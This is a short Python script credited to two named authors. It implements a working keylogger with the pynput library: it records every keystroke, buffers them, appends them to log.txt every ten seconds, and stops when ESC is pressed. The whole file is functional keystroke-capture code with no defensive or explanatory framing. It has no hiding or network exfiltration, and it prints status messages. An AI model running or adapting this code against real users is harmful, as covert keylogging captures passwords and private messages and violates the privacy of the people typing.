# Authors: Nikoloz Kurtanidze & James McGrath

import threading
from pynput import keyboard

# File to save the keystrokes
log_file = "log.txt"

# Global variablse
text = ""
time_interval = 10
timer = None  # Global timer variable

def write_to_file():
    global text, timer
    if text:
        try:
            with open(log_file, "a") as file:
                file.write(text)
            text = ""  # Clear the buffer after writing
        except Exception as e:
            print(f"Error writing to file: {e}")

    # Restart the timer only if the listener is still running
    if listener.running:
        timer = threading.Timer(time_interval, write_to_file)
        timer.start()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            pass
        elif key == keyboard.Key.backspace and text:
            text = text[:-1]
        elif key == keyboard.Key.esc:
            stop_logging()  # Stop logging upon press of the ESC key
            return False
        else:
            text += str(key).strip("'")
    except Exception as e:
        print(f"Error processing key: {e}")

def stop_logging():
    """Stops the timer and exits cleanly."""
    global timer
    if timer:
        timer.cancel()  # Stop the timer.
    print("Logging stopped.")

# Start logging the keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    timer = threading.Timer(time_interval, write_to_file)
    timer.start()
    listener.join()

